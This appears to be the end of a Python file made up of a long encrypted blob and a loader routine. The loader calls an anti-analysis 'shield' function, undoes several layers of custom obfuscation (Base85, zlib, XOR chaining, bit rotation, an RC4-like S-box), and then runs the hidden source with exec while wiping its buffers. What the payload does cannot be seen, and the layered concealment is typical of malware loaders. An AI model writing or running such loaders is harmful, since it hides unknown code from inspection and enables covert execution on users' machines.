    "Q|cw#Wyx#atV+aV(11zUljky93f0nQ{xow^hYA+$9TU*_V6RlERg>XILNTi+s_<t|FzGCKdV$_kX0wrXq8laqnC)-$@v"
    "mkQfnjak<#6kCuQBaf->B`3E8<YrpVS%amQqc+KWacH!@)-F1FryCQ+}-E{Ff&mU_leVec8mnTh}a5jC!V`RV;TUk-!h"
    "{oXFs{**2Y-950K8NKB@7y_S7{-wO8A!!i=SdOWhedQ2!j^LxrA5#aU)8vBI>il+Ckw6#_I(0<cTdq!g0DWcMy+?=SY_"
    "dtp62&;@=5nu<ETP75xC<T(;y8r`bI9By4xX=q6%IdAi{T|g?@K}u76I9EKr@Zl!S`5|+o`#ybrP!)<5w&%(i2bQh3SL"
    "11Pygh1TMeFS;Nk9@-3IH8CVVN&ni8O_uARqq$W<S!g4fuI;b<=s#ShQ&Sr3(o$*4Q|ije6+R7H>!<6SJR2EU*qT>7)q"
    "(192Blb^TyiU?B6?}6a=u#nWh#g1-Cu<&Q0kX6&*zV1ISzRhP%WX`P+UEazCZYnrHi~mZzs!Yy_W}t;T91aet6_Ki@^k"
    "dNM+)0Pbt|9n((BnKDzto~D&n}z7K_xV)pXS}{TfU^!vAvt8Dn|{K!L3N(*I)ZWQi!P+?*NcK4R=bj)W1u4=C(hb<Zxj"
    "Tg;@&A5}6epY9%`_#|iALqBT0`DuuLgvK~qJF^qUL@RXcla#<#9r^k0or4nAFwQvci&+E*crfk`=4F}W_A|UQZC%W_NG"
    "9+d;Y(8|KyS%+DR9vn;B*^|I{<jmBiAEa%9N1rXvzWvmqF;_jDU$D)!4^th`Hyy5H-$Y#0%^id{{Qly7JpDqAfP9+SeR"
    "qrNm^)i)UZM1Ku<zipGv(pGOMtkeH%0G<_`|iY%@9?cHa<w-zgC=d>!ruD2s0!H%)hX1iYZ6h`m`@FQ4%F#IFJ%zbf=?"
    "6&9*1QPV(ZKI>MS3#xQ9`86jFJ((H|CJK6QpZGUnP!MSRJ<V~CTEUv9x<0}3nuoVMRcF%4shA=)hX7UHIUs~QSQzcgA#"
    "rPp4v<VwGiBB1UR}lHvslW8c#oq1_1d!}wE}Ss`-6ZpbvcN<@~N2+Bli!%ED1#=>;zEt26BVBZ>J$5u*^S9h0Pu9;<U$"
    "SMh`A!q-X9KJPSB_Q3!(dz2^wRNp!w#6gpL|pn%Y{elC!+qYY;KK!vZ>IL5?)^CVidXqgM+cOvvnsR-k68%B>|XaJ*mV"
    "x68shxJv(;z%PlPVz;TIcEZMUmPC=Z!wf{u!6}`eY!IDW$+#4=2WzB+mb@n48ArX=ND7bk#6~*73IaHfgsb=wH&h!rLi"
    "6LJeCaffXbvfU1MN2UNSQ@LRiq7Yra>6DlED1OphV}?13DR*2P-p#Jv}MhTIE({$t*TZhZ%(fH$SxpE$TUSPS`5m#aVo"
    "hi@?*U+RHS?f&Abo?v~fSFc0B2+ZNhyT*>S9GeC1S+tq=XbGM&n~MJK9e9yvoNXZ8OivlXsu$_C|K0Ll{VaEm93)Qach"
    "K161{bv@`1x?-OaL1(2)}(<N5)a=)dnD_q^(7Z?>&z5pM#O}?ODs-7%YhR3HSj+M;glb2-I5S^_WwQQwK%6H2zU^hjuM"
    "`sXFEu%Z6^LI=toG4PmNAi!)G38SvfFceO79{Ub86*L!!#@)#qv-GE5uIaF13NteF3PEDZiCQ={z{I%pO@Asu$G7D2Z$"
    "x~k#M`&&5V&<b-gQOwriYYbO1N^a3ULd!>0Ma4v+d0BjHWjP%u6-RBGb5T2@(@m@W$>Z))}4Q6WlbY~{3ksS-N;h22o6"
    "HajNhG$0q?_Nft=tqZ^B_u4xFL$Va`vpe*iBaw0Z#3%)Ruv!&!yLkf;<bCq?F5C^_*>lajL-i5`%M0f^Bb9^5cNzs;*r"
    "yyVpL3TDZu`#tn*3n??im@v&58%zkE!~E6w-If@jylf|cD410Wc`!_i_kW2M38)sVf`(>^W#<lz0}Emfqw>uv&A^-O9`"
    "Nq=n>M+YApS^D)j?~W!<Pm(Bsw2yE&d|gZS*&N)V^o*ne2{Uhl6%DnNaQyZ=CX;kpiyLN+wY?4@uu{<y}IFk#Pwf6xd)"
    "<`OZfK!3a4&RF&e*+<T66U!$8X`3f7h5qLIA6C!!8jPKUYtQ58?&h(37)0Fg;KC_Jk5JZe5wxMGuN%{kQcD2Zlcdz9YD"
    "?dc<=dVvl`OPe;y{%_DTM*lNKK+{1FnrUZ+#<o$B|Tw8MGGrPsL{Wh{wMBu?iSr4mT901MLr_PwHS+ea>X^&imdSMbl&"
    "Mu+eruS^P=Y+&1P`J*yBym<MOa%XB_bc&maJ_gaMdM?Ou>Z@}<7w(r@@2+IuSK;ZX<kjJqF^d<psVYu+O2nKK!sC|T8n"
    "?G7X61HG?mIg*0&SE=@8God1;ANOn(rdzAbGa8$aaUNnrNFpBQCJJ#I_|Di2TYJ~Lpy)>86>l%oc#6L?x$x=xkzpJfsp"
    "(_>Rc<{%I?$TnRnoCj%v!(3l`w*CY6U(gO+k`^(O#ABLkQ#9xVhxUtlYAlco}ft45tz^lCmBNpLOmCL%yowZtz!a_w^K"
    "wT#t4>CR?r^7Ksv_kuYB<OK{<6)eq8)<RCfzi(TXbIurAU1VW%E$7ncPH||vb6L>pr(or{IvK1l}o<Gwj3<4I-+Yrb4+"
    "`Y`y$3z^_T<O^f77bSC*q2iROvP+^H`ASw?P0hyI)8JUz4j+d8?8y2tUv%#+SMk2$Q~!Py|hXI4r;^7IBxHs%emP_ede"
    "SRP<HeFEgJ!&A|()%Yn^|kHCdcdWf({ZY{p1BWPJ4EdGLpQv;$sI>NM=@jiRTqYc=ig@h*qM>WOON%4QGhF55RH#aVi0"
    "p|(nG>2jS0t?y8+jzQ~FZU2JKa)U(B4F~caM^*gE9&EAvzpL#;-drHax(4VpJ`ZT`<!|%^s#1=XJ!J(@h;Y)qJbVHURT"
    "x%L+1f|nQ%!1Jux4zZ@ERxwP9EVbQZHZPQd%T%Y7fZvR0d99TdQZSJ;>M(`D|9tqbssiQ4$?l#{B!_@PL~8=Mku%57Ej"
    "Q#zN4<Qs=D80O+!9JMOxI$ImRZqh~ox)GQ?{dGzYzV)oT{<&}RiAE{K(jCOcmB3#-M)Y#JjL2kP"
)

def _boot():
    _0x_shield()
    try:
        _k_len = len(_0x_raw_key)
        # S-Box Inversion
        _sb = bytearray(range(256))
        _j = 0
        for _i in range(256):
            _j = (_j + _sb[_i] + _0x_raw_key[_i % _k_len]) & 0xFF
            _sb[_i], _sb[_j] = _sb[_j], _sb[_i]
        _inv_sb = bytearray(256)
        for _i in range(256):
            _inv_sb[_sb[_i]] = _i

        # Layer 1: Base85 + Zlib Decompress
        _d1 = _0x02.b85decode(_0x_payload.encode("ascii"))
        _d_cbc = bytearray(_0x03.decompress(_d1))

        # Layer 2: Inverse CBC feedback
        _d_rot = bytearray()
        _prev = 0x5A
        for _b in _d_cbc:
            _orig_b = _b ^ _prev
            _d_rot.append(_orig_b)
            _prev = _b

        # Layer 3: Inverse Bit-rotation & Keystream
        _d_sub = bytearray()
        for _i, _b in enumerate(_d_rot):
            _k = _0x_raw_key[_i % _k_len]
            _r = _b ^ _k ^ ((_i * 17) & 0xFF)
            _orig = ((_r >> 5) | (_r << 3)) & 0xFF
            _d_sub.append(_orig)

        # Layer 4: Inverse S-Box
        _d_c1 = bytearray(_inv_sb[_b] for _b in _d_sub)

        # Layer 5: Final Decompression
        _raw_src = _0x03.decompress(bytes(_d_c1)).decode("utf-8")
        _code = compile(_raw_src, "<m9mq_core_engine>", "exec")

        # Memory Sanitization
        _d1 = None
        _d_cbc.clear()
        _d_rot.clear()
        _d_sub.clear()
        _d_c1.clear()
        del _raw_src
    except Exception as _e:
        print(f"\n  \x1b[38;2;239;68;68m[FATAL] Decryption error: {_e}\x1b[0m\n")
        _0x01.exit(1)

    try:
        exec(_code, globals(), globals())
    except KeyboardInterrupt:
        pass
    except Exception as _e:
        print(f"\n  [ERROR] {_e}\n")
    finally:
        if _0x01.platform == "win32":
            try:
                input("\n  Press Enter to exit...")
            except Exception:
                pass

if __name__ == "__main__":
    _boot()
